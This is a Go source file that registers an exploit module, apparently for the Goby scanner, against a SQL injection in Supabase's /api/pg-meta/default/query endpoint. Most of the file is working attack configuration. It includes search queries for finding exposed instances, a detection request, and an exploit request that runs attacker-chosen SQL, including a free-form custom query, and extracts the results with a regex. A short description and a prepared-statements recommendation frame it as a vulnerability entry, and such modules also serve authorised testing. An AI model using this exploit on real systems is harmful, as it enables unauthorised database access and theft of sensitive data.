package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Supabase /api/pg-meta/default/query SQL Injection Vulnerability",
    "Description": "<p>Supabase is an open-source Firebase alternative that provides backend services. This vulnerability exists in the /api/pg-meta/default/query interface of Supabase, where lack of input validation and filtering allows attackers to craft malicious SQL statements to execute arbitrary SQL commands, potentially accessing sensitive information in the database or even gaining further server privileges.</p>",
    "Product": "Supabase",
    "Homepage": "https://supabase.com",
    "DisclosureDate": "2024-06-26",
    "PostTime": "2024-11-20",
    "Author": "Cherry_xxj@163.com",
    "FofaQuery": "title=\"supabase\"",
    "GobyQuery": "title=\"supabase\"",
    "Level": "3",
    "Impact": "<p>This vulnerability allows attackers to execute arbitrary SQL commands via SQL injection, potentially leading to sensitive data leakage, data tampering, or even server privilege escalation, causing severe consequences.</p>",
    "Recommendation": "<p>It is recommended to use prepared statements to prevent SQL injection and escape special characters entering the database to ensure input data security.</p>",
    "References": [
        "https://blog.csdn.net/qq_41904294/article/details/135443624"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "SELECT CURRENT_DATABASE(),SELECT VERSION(),SELECT CURRENT_USER",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "SELECT CURRENT_DATABASE()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/api/pg-meta/default/query",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/json",
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15"
                },
                "data_type": "text",
                "data": "{\"query\":\"select version()\"}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "PostgreSQL",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/api/pg-meta/default/query",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/json",
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15"
                },
                "data_type": "text",
                "data": "{\"query\":\"SELECT '112233' || ({{{payload}}}) || '332211'\"}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|112233([^'][\\s\\S]*?)332211",
                "output|when|attackType=sqlpoint|{{{lastreq}}}"
            ]
        }
    ],
    "Tags": [
        "SQL Injection",
        "Ai"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.5",
    "Translation": {
        "CN": {
            "Name": "Supabase /api/pg-meta/default/query SQL注入漏洞",
            "Product": "Supabase",
            "Description": "<p>Supabase 是一个开源的 Firebase 替代品，提供后端服务。该漏洞存在于Supabase的/api/pg-meta/default/query接口，由于未对用户输入进行校验和过滤，攻击者可以通过构造恶意SQL语句，执行任意SQL命令，从而获取数据库中的敏感信息，甚至可能进一步获取服务器权限。</p>",
            "Recommendation": "<p>建议使用预编译语句来防止SQL注入，并对进入数据库的特殊字符进行转义处理，以确保输入数据的安全性。</p>",
            "Impact": "<p>该漏洞允许攻击者通过SQL注入执行任意SQL命令，可能导致敏感数据泄露、数据篡改、甚至服务器权限获取等严重后果。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "AI"
            ]
        },
        "EN": {
            "Name": "Supabase /api/pg-meta/default/query SQL Injection Vulnerability",
            "Product": "Supabase",
            "Description": "<p>Supabase is an open-source Firebase alternative that provides backend services. This vulnerability exists in the /api/pg-meta/default/query interface of Supabase, where lack of input validation and filtering allows attackers to craft malicious SQL statements to execute arbitrary SQL commands, potentially accessing sensitive information in the database or even gaining further server privileges.</p>",
            "Recommendation": "<p>It is recommended to use prepared statements to prevent SQL injection and escape special characters entering the database to ensure input data security.</p>",
            "Impact": "<p>This vulnerability allows attackers to execute arbitrary SQL commands via SQL injection, potentially leading to sensitive data leakage, data tampering, or even server privilege escalation, causing severe consequences.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "Ai"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "payload": "switch|attackType|{{{default}}}"
    },
    "EditType": "fast",
    "PocId": "9973"
}`
  
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}